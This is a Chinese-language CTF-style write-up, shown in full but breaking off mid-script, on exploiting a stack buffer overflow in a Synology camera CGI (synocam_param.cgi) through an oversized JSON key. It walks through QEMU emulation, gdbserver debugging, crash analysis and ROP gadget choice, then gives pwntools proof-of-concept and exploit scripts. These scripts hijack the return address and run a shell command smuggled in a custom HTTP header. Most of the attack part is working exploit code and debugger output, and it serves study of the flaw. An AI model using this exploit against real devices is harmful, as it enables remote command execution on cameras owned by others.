<figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-arm \</span><br><span class="line">	-m 1024 \</span><br><span class="line">	-M virt,highmem=off \</span><br><span class="line"> 	-kernel zImage \</span><br><span class="line">    	-initrd player.cpio \</span><br><span class="line">	-nic user,hostfwd=tcp:0.0.0.0:8801-:80,hostfwd=tcp:0.0.0.0:8802-:8802,hostfwd=tcp:0.0.0.0:1234-:1234 \</span><br><span class="line"> 	-nographic</span><br></pre></td></tr></tbody></table></figure>

<p>调试方法有很多种，qemu调试cgi、fork + execute调试、patch、这里已经发现了漏洞，直接采用真实的远程环境来调试exp</p>
<p>采取<a target="_blank" rel="noopener" href="https://blog.csdn.net/tuzhutuzhu/article/details/23705485">GDB调试fork+exec创建的子进程的方法</a>来调试</p>
<p>attach到webd这个pid中</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># ps</span></span><br><span class="line">ps</span><br><span class="line">PID   USER     TIME  COMMAND</span><br><span class="line">    1 synodebu  1:18 init</span><br><span class="line">    2 synodebu  0:00 [kthreadd]</span><br><span class="line">    3 synodebu  0:00 [rcu_gp]</span><br><span class="line">    4 synodebu  0:00 [rcu_par_gp]</span><br><span class="line">    5 synodebu  0:00 [slub_flushwq]</span><br><span class="line">    7 synodebu  0:00 [kworker/0:0H-ev]</span><br><span class="line">    9 synodebu  0:00 [mm_percpu_wq]</span><br><span class="line">   10 synodebu  5:58 [ksoftirqd/0]</span><br><span class="line">   11 synodebu  1h16 [rcu_sched]</span><br><span class="line">   12 synodebu  0:00 [migration/0]</span><br><span class="line">   13 synodebu  0:00 [cpuhp/0]</span><br><span class="line">   14 synodebu  0:00 [kdevtmpfs]</span><br><span class="line">   15 synodebu  0:00 [inet_frag_wq]</span><br><span class="line">   16 synodebu  2:43 [kworker/0:1-eve]</span><br><span class="line">   17 synodebu  0:00 [oom_reaper]</span><br><span class="line">   18 synodebu  0:00 [writeback]</span><br><span class="line">   19 synodebu  4:13 [kcompactd0]</span><br><span class="line">   35 synodebu  0:00 [kblockd]</span><br><span class="line">   36 synodebu  0:00 [ata_sff]</span><br><span class="line">   37 synodebu  0:00 [edac-poller]</span><br><span class="line">   38 synodebu  0:00 [devfreq_wq]</span><br><span class="line">   39 synodebu  0:00 [watchdogd]</span><br><span class="line">   40 synodebu  0:00 [kworker/u2:1-ev]</span><br><span class="line">   41 synodebu  0:00 [rpciod]</span><br><span class="line">   42 synodebu  0:00 [kworker/0:1H]</span><br><span class="line">   43 synodebu  0:00 [kworker/u3:0]</span><br><span class="line">   44 synodebu  0:00 [xprtiod]</span><br><span class="line">   45 synodebu  0:00 [kswapd0]</span><br><span class="line">   46 synodebu  0:00 [kworker/u2:2-ev]</span><br><span class="line">   47 synodebu  0:00 [nfsiod]</span><br><span class="line">   50 synodebu  0:00 [mld]</span><br><span class="line">   51 synodebu  0:00 [ipv6_addrconf]</span><br><span class="line">   52 synodebu  0:00 [kworker/0:2]</span><br><span class="line">  129 synodebu  0:00 inetd</span><br><span class="line">  208 synodebu  0:00 /bin/kmesg_monitor</span><br><span class="line">  210 synodebu  7h57 /bin/systemd</span><br><span class="line">  232 synodebu 12:11 ntpdaemon</span><br><span class="line">  240 synodebu 17:31 syslogd -b 1 -s 200 -n -f /tmp/syslogd.conf</span><br><span class="line">  318 synodebu  0:41 wpa_supplicant -ieth0 -Dwired -c /tmp/wpa_supplicant-eth0.</span><br><span class="line">  322 synodebu  0:05 zcip -f eth0 /bin/zcipnotify</span><br><span class="line">  330 synodebu  1:00 dhcpcd: eth0 [ip4]</span><br><span class="line">  363 synodebu 11h34 /bin/streamd</span><br><span class="line">  367 synodebu 34:09 /bin/central_server</span><br><span class="line">  369 synodebu 33:35 /bin/synoactiond</span><br><span class="line">  375 synodebu 20:25 /bin/recorder</span><br><span class="line">  428 synodebu  0:01 telnetd -p 9901 -l /bin/sh</span><br><span class="line">  431 synodebu  0:00 init</span><br><span class="line">  559 synodebu  5h33 /bin/webd</span><br><span class="line"> 4853 synodebu  0:00 /bin/sh</span><br><span class="line"> 4858 synodebu  0:00 ps</span><br><span class="line"> / <span class="comment"># gdbserver :1234 --attach 559</span></span><br><span class="line">gdbserver :1234 --attach 559</span><br><span class="line">Attached; pid = 559</span><br><span class="line">Listening on port 123</span><br></pre></td></tr></tbody></table></figure>

<p>用gdb-multiarch连上来之后就可以发现已经可以调试webd了</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> follow-fork-mode parent                                                                      </span><br><span class="line">pwndbg&gt; c                                                                                                </span><br><span class="line">Continuing.                                                                                               </span><br><span class="line">[Detaching after vfork from child process 6200]                                                     </span><br><span class="line">[Detaching after fork from child process 6201]</span><br></pre></td></tr></tbody></table></figure>

<p>有个vfork，跳过这个vfork，直接捕获一下fork</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> follow-fork-mode parent                                                                      </span><br><span class="line">pwndbg&gt; catch fork</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></tbody></table></figure>

<p>此时vfork已经被跳过，此时已经到了fork这里，跟进cgi程序，捕获exec之后就可以发现已经到了synocam_param.cgi，但是会卡住，虽然会卡住，但是不影响执行命令，回车之后继续Continuing，此时发现目标crash</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> follow-fork-mode child                                                                      </span><br><span class="line">pwndbg&gt; catch <span class="built_in">exec</span></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">......</span><br><span class="line">Thread 2.1 <span class="string">"synocam_param.c"</span> hit Catchpoint 2 (<span class="built_in">exec</span><span class="string">'d /www/camera-cgi/synocam_param.cgi), 0x76fcea00 in ?? () from target:/lib/ld-linux-armhf.so.3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Continuing.</span></span><br><span class="line"><span class="string">Reading /lib/libjansson.so.4 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libutil.so from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libpthread.so.0 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libcurl.so.4 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libcrypto.so.1.1 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libssl.so.1.1 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libz.so.1 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libdl.so.2 from remote target...</span></span><br><span class="line"><span class="string">Reading /usr/lib/libstdc++.so.6 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libm.so.6 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libgcc_s.so.1 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libc.so.6 from remote target...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Thread 2.1 "synocam_param.c" received signal SIGSEGV, Segmentation fault.</span></span><br><span class="line"><span class="string">0x76fb7f88 in ?? () from target:/lib/libjansson.so.4</span></span><br></pre></td></tr></tbody></table></figure>

<p>crash之后的状态</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────</span><br><span class="line">*R0   0x7efff240 ◂— <span class="string">'aaaa'</span></span><br><span class="line"> R1   0x0</span><br><span class="line"> R2   0x0</span><br><span class="line">*R3   0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">*R4   0x4b7954 ◂— 0xb77f4</span><br><span class="line"> R5   0x0</span><br><span class="line">*R6   0x407464 ◂— mov fp, <span class="comment">#0</span></span><br><span class="line"> R7   0x0</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x0</span><br><span class="line">*R10  0x4b7954 ◂— 0xb77f4</span><br><span class="line">*R11  0x7efff144 —▸ 0x7efff15c —▸ 0x76fb4c40 ◂— ldr r3, [fp, <span class="comment">#-0x48]</span></span><br><span class="line"> R12  0x0</span><br><span class="line">*SP   0x7efff138 ◂— 0x0</span><br><span class="line">*PC   0x76fb7f88 ◂— strb r2, [r3]</span><br><span class="line">────────────────────────────────────[ DISASM / arm / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]─────────────────────────────────────</span><br><span class="line"> ► 0x76fb7f88    strb   r2, [r3]</span><br><span class="line">   0x76fb7f8c    nop</span><br><span class="line">   0x76fb7f90    add    sp, fp, <span class="comment">#0</span></span><br><span class="line">   0x76fb7f94    pop    {fp}</span><br><span class="line">   0x76fb7f98    bx     lr</span><br><span class="line"></span><br><span class="line">   0x76fb7f9c    str    fp, [sp, <span class="comment">#-4]!</span></span><br><span class="line">   0x76fb7fa0    add    fp, sp, <span class="comment">#0</span></span><br><span class="line">   0x76fb7fa4    sub    sp, sp, <span class="comment">#0xc</span></span><br><span class="line">   0x76fb7fa8    str    r0, [fp, <span class="comment">#-8]</span></span><br><span class="line">   0x76fb7fac    ldr    r3, [fp, <span class="comment">#-8]</span></span><br><span class="line">   0x76fb7fb0    ldr    r3, [r3]</span><br></pre></td></tr></tbody></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>为了方便调试，直接写个脚本来捕获cgi</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target remote :1234</span><br><span class="line"><span class="built_in">set</span> follow-fork-mode parent</span><br><span class="line">catch fork</span><br><span class="line">c</span><br><span class="line"><span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">catch <span class="built_in">exec</span></span><br><span class="line">c</span><br></pre></td></tr></tbody></table></figure>

<p>此时卡住之后发现cgi没有被彻底载入</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">     Start        End Perm     Size Offset File</span><br><span class="line">  0x400000   0x4a7000 r-xp    a7000      0 /www/camera-cgi/synocam_param.cgi</span><br><span class="line">  0x4b7000   0x4b9000 rw-p     2000  a7000 /www/camera-cgi/synocam_param.cgi</span><br><span class="line">0x76fce000 0x76fee000 r-xp    20000      0 /lib/ld-2.30.so</span><br><span class="line">0x76ffb000 0x76ffc000 r-xp     1000      0 [sigpage]</span><br><span class="line">0x76ffc000 0x76ffd000 r--p     1000      0 [vvar]</span><br><span class="line">0x76ffd000 0x76ffe000 r-xp     1000      0 [vdso]</span><br><span class="line">0x76ffe000 0x77000000 rw-p     2000  20000 /lib/ld-2.30.so</span><br><span class="line">0x7efdf000 0x7f000000 rw-p    21000      0 [stack]</span><br><span class="line">0xffff0000 0xffff1000 r-xp     1000      0 [vectors]</span><br></pre></td></tr></tbody></table></figure>

<p>在0x7464这里下断点之后就可以看到<code>/lib/libjansson.so.4.7.0</code>的地址，此时跟据这个基址在漏洞点下一个断点，就可以调试漏洞点了</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">0x76fae000 0x76fbd000 r-xp     f000      0 /lib/libjansson.so.4.7.0</span><br><span class="line">0x76fbd000 0x76fcc000 ---p     f000   f000 /lib/libjansson.so.4.7.0</span><br><span class="line">0x76fcc000 0x76fcd000 r--p     1000   e000 /lib/libjansson.so.4.7.0</span><br><span class="line">0x76fcd000 0x76fce000 rw-p     1000   f000 /lib/libjansson.so.4.7.0</span><br><span class="line">......</span><br><span class="line">pwndbg&gt; b *0x76fae000 + 0x6BE0</span><br><span class="line">Breakpoint 4 at 0x76fb4be0</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Thread 2.1 <span class="string">"synocam_param.c"</span> hit Breakpoint 4, 0x76fb4be0 <span class="keyword">in</span> ?? () from target:/lib/libjansson.so.4</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x76fae000 + 0x6BE4</span><br><span class="line">Breakpoint 5 at 0x76fb4be4</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing</span><br><span class="line">......</span><br><span class="line">pwndbg&gt; x/20wx 0x7efff174</span><br><span class="line">0x7efff174:     0x76fd0061      0x00000001      0x76ff7000      0x7efff168</span><br><span class="line">0x7efff184:     0x7bfff210      0x7b000001      0x00000001      0x7efff1ab</span><br><span class="line">0x7efff194:     0x61616161      0x61616161      0x61616161      0x61616161</span><br><span class="line">0x7efff1a4:     0x61616161      0x61616161      0x61616161      0x61616161</span><br><span class="line">0x7efff1b4:     0x61616161      0x61616161      0x61616161      0x61616161</span><br></pre></td></tr></tbody></table></figure>

<p>调试之后，如下Poc就可以劫持返回地址为0x62626262了</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'arm'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\033[32m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">8801</span></span><br><span class="line"></span><br><span class="line">r = remote(ip, port)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a '</span> + <span class="string">b'a'</span> * (<span class="number">0x60</span> + <span class="number">0x24</span>) + <span class="string">b'b'</span> * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">value = <span class="string">b'""'</span></span><br><span class="line">json = <span class="string">b'{"'</span> + p1 + <span class="string">b'": ""}'</span></span><br><span class="line">li(json)</span><br><span class="line"></span><br><span class="line">rn = <span class="string">b'\r\n'</span></span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b''</span></span><br><span class="line">p3 += <span class="string">b'POST /syno-api/security/info/mac HTTP/1.1'</span> + rn</span><br><span class="line">p3 += (<span class="string">b"Content-Length: %d"</span> % <span class="built_in">len</span>(json)) +rn</span><br><span class="line">p3 += <span class="string">b'Host: 127.0.0.1:8801'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept: text/plain, */*; q=0.01'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Content-Type: application/json'</span> + rn</span><br><span class="line">p3 += <span class="string">b'X-Requested-With: XMLHttpRequest'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua-mobile: ?0'</span> + rn</span><br><span class="line">p3 += <span class="string">b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua-platform: "macOS"'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Origin: http://127.0.0.1:8801'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Site: same-origin'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Mode: cors'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Dest: empty'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Referer: http://127.0.0.1:8801/'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept-Encoding: gzip, deflate'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept-Language: zh-CN,zh;q=0.9'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Cookie: sid=sBmrHHr4XX4TKaIjv0Vw6L3I15y46m47DO9qeF79CPjquIMOAHX6ygmRJ2AaNleg'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Connection: close'</span> + rn</span><br><span class="line">p3 += rn</span><br><span class="line">p3 += json</span><br><span class="line"></span><br><span class="line">li(<span class="string">'[+] sendling payload'</span>)</span><br><span class="line">r.send(p3)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<p>寻找合适的gadget，符合可见字符，因为aslr为1，最后的利用需要爆破，这里为了方便会关闭aslr。binary_base前面为0x4开头的时候binary里有些地址gadget会符合要求，如下gadget</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00014D5C                 STR             R3, [R11,#var_30]</span><br><span class="line">.text:00014D60                 LDR             R0, [R11,#var_38]</span><br><span class="line">.text:00014D64                 BL              _ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv ; std::string::c_str(void)</span><br><span class="line">.text:00014D68                 MOV             R2, R0</span><br><span class="line">.text:00014D6C                 LDR             R3, =(aR_0 - 0x14D78) ; "r"</span><br><span class="line">.text:00014D70                 ADD             R3, PC, R3 ; "r"</span><br><span class="line">.text:00014D74                 MOV             R1, R3  ; modes</span><br><span class="line">.text:00014D78                 MOV             R0, R2  ; command</span><br></pre></td></tr></tbody></table></figure>

<p>这里有很多方法来getshell，如果采取rop利用，R11这里的地址刚好在栈上，我尝试之后发现如果使用多个key和value，这些值会往上跑，最后可以跑到r11这里，此时就可以写很长的命令来执行</p>
<p>还有一种方法是从<code>00014D68</code>这里的地址开始的gadget，此时的寄存器状态如下</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*R0   0x7efff1e0 ◂— <span class="string">'aaaaaaaa\\MA'</span></span><br><span class="line"> R1   0x0</span><br><span class="line">*R2   0x7efff1e0 ◂— <span class="string">'aaaaaaaa\\MA'</span></span><br><span class="line">*R3   0x414d5c ◂— mov r2, r0</span><br><span class="line"> R4   0x4b7954 ◂— 0xb77f4</span><br><span class="line"> R5   0x0</span><br><span class="line"> R6   0x407464 ◂— mov fp, <span class="comment">#0</span></span><br><span class="line"> R7   0x0</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x4b7954 ◂— 0xb77f4</span><br><span class="line">*R11  0x7efff104 —▸ 0x76fb3840 ◂— mov r3, r0</span><br><span class="line"> R12  0x0</span><br><span class="line">*SP   0x7efff0e8 ◂— 0x0</span><br><span class="line">*PC   0x414d5c ◂— mov r2, r0</span><br></pre></td></tr></tbody></table></figure>

<p>r0这里可以控制8个字节的命令，最后一个字节用;来隔开进行命令执行，但是在调试的时候发现<code>00014D68</code>这里的地址需要细调，最后的地址为<code>00014D5C</code>，传入自定义的请求头也可以写很长的命令了</p>
<p>exp如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'arm'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\033[32m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">8801</span></span><br><span class="line"></span><br><span class="line">r = remote(ip, port)</span><br><span class="line"></span><br><span class="line">binary_base = <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget = 0x14D5c + binary_base</span></span><br><span class="line">gadget = <span class="number">0x14D5c</span> + binary_base</span><br><span class="line"><span class="comment">#gadget = 0x414d5c</span></span><br><span class="line"><span class="comment">#gadget = 0x00018a7c + binary_base</span></span><br><span class="line"><span class="comment">#gadget = 0x14d60 + binary_base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x00018a7c : mov r0, r2 ; blx r3</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b'$HTTP_A'</span></span><br><span class="line">cmd = cmd.ljust(<span class="number">8</span>, <span class="string">b';'</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a '</span> + <span class="string">b'b'</span> * (<span class="number">0x60</span> + <span class="number">0x24</span> - <span class="number">8</span>) + cmd + <span class="string">b'\u005c\u004d\u0041'</span><span class="comment">#p32(gadget)[:3]</span></span><br><span class="line"></span><br><span class="line">value = <span class="string">b'""'</span></span><br><span class="line">json = <span class="string">b'{"'</span> + p1 + <span class="string">b'": ""}'</span></span><br><span class="line">li(json)</span><br><span class="line"></span><br><span class="line">rn = <span class="string">b'\r\n'</span></span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b''</span></span><br><span class="line">p3 += <span class="string">b'POST /syno-api/security/info/mac HTTP/1.1'</span> + rn</span><br><span class="line">p3 += (<span class="string">b"Content-Length: %d"</span> % <span class="built_in">len</span>(json)) +rn</span><br><span class="line">p3 += <span class="string">b'Host: 127.0.0.1:8801'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"'</span> + rn</span><br><span class="line">p3 += <span class="string">b'A: cp /flag /www/index.html'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept: text/plain, */*; q=0.01'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Content-Type: application/json'</span> + rn</span><br><span class="line">p3 += <span class="string">b'X-Requested-With: XMLHttpRequest'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua-mobile: ?0'</span> + rn</span><br><span class="line">p3 += <span class="string">b'User-Agent: 